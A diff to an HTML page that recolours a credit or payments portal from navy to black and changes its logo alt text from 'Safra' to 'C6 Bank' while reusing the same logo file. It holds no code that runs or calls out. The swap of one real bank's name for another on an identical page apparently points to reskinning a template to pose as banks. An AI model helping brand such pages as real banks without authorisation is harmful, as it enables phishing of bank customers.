@@ -11,11 +11,11 @@
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap');
 
     :root {
-      --primary: #020031;
-      --accent: #020031;
-      --accent-yellow: #020031;
-      --accent-gold: #0B0A52;
-      --primary-deep: #020031;
+      --primary: #000000;
+      --accent: #000000;
+      --accent-yellow: #000000;
+      --accent-gold: #1A1A1A;
+      --primary-deep: #000000;
       --primary-light: #fef0e4;
       --primary-subtle: #F8F8F8;
       --bg: #F5F5F5;
@@ -67,7 +67,7 @@
 
     .logo{ display: flex; align-items: center; user-select: none; }
         .logo-cred{ font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
-    .logo-diamond{ width:7px; height:7px; background:#020031; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
+    .logo-diamond{ width:7px; height:7px; background:#000000; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
     .logo-on{ font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:20px; color:#333333; letter-spacing:-0.5px; line-height:1; }
 
     .header-right{ display: flex; align-items: center; gap: 10px; }
@@ -77,9 +77,9 @@
     .user-icon-wrapper{
       width:40px; height:40px; background:#fef0e4; border-radius:50%;
       display:flex; align-items:center; justify-content:center;
-      border:2px solid #020031; color:#020031;
+      border:2px solid #000000; color:#000000;
     }
-    .user-icon-wrapper svg{ width:20px; height:20px; color:#020031; }
+    .user-icon-wrapper svg{ width:20px; height:20px; color:#000000; }
 
     /* MAIN */
     .main-container{
@@ -145,7 +145,7 @@
       font-size: 1rem; font-weight: 700; cursor: pointer;
       font-family: 'Hind Siliguri', sans-serif;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 12px rgba(2,0,49,0.3);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
       position: relative; overflow: hidden;
     }
     .btn-primary::before{
@@ -158,7 +158,7 @@
     .btn-primary:hover{
       transform:translateY(-2px);
       box-shadow:0 6px 16px rgba(74,185,105,0.35);
-      background:#0B0A52;
+      background:#1A1A1A;
     }
     .btn-primary:active{transform:translateY(0);}
 
@@ -173,13 +173,13 @@
     .due-date-btn::after{
       content: ''; margin-left: auto; flex-shrink: 0;
       width: 30px; height: 30px; border-radius: 50%;
-      background: #020031 url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M9 6l6 6-6 6'/%3E%3C/svg%3E") center/16px no-repeat;
+      background: #000000 url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M9 6l6 6-6 6'/%3E%3C/svg%3E") center/16px no-repeat;
       transition: transform .2s;
     }
     .due-date-btn:hover{
-      border-color: #020031;
+      border-color: #000000;
       background: #FFF7F0;
-      box-shadow: 0 6px 16px -6px rgba(2,0,49,.35);
+      box-shadow: 0 6px 16px -6px rgba(0,0,0,.35);
       transform: none;
     }
     .due-date-btn:hover::after{ transform: translateX(3px); }
@@ -187,7 +187,7 @@
     .due-date-number{
       width: 50px; height: 50px; flex-shrink: 0;
       display: grid; place-items: center;
-      border-radius: 14px; background: #020031; color: #fff;
+      border-radius: 14px; background: #000000; color: #fff;
       font-size: 1.3rem; font-weight: 800; letter-spacing: -.5px;
     }
     .due-date-text{
@@ -265,11 +265,11 @@
 .ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
 .ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
 .ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
-.ss-footer-links a:hover{color:#020031}
+.ss-footer-links a:hover{color:#000000}
 .ss-footer-links span{opacity:.4;font-size:12px}
 .ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
 .ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
-.ss-footer-badges svg{width:14px;height:14px;color:#020031}
+.ss-footer-badges svg{width:14px;height:14px;color:#000000}
 .ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
 .ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
 .ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
@@ -283,7 +283,7 @@
 .ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
 .ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
 .ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
-.ss-contact-icon{width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon{width:48px;height:48px;background:#000000;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .ss-contact-icon svg{color:#fff;width:24px;height:24px}
 .ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
 .ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
@@ -305,7 +305,7 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
           </svg>
         </div>
-        <img src="../images/logo.png?v=safra2" alt="Safra" class="header-logo">
+        <img src="../images/logo.png?v=safra2" alt="C6 Bank" class="header-logo">
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -454,7 +454,7 @@
 
 <!-- FOOTER BOM PRA CRÉDITO -->
 <footer class="ss-footer">
-  <div class="ss-footer-logo"><img src="../images/logo.png?v=safra2" alt="Safra"></div>
+  <div class="ss-footer-logo"><img src="../images/logo.png?v=safra2" alt="C6 Bank"></div>
   <p class="ss-footer-company">&copy; 2026 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
   <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
   <div class="ss-footer-links">
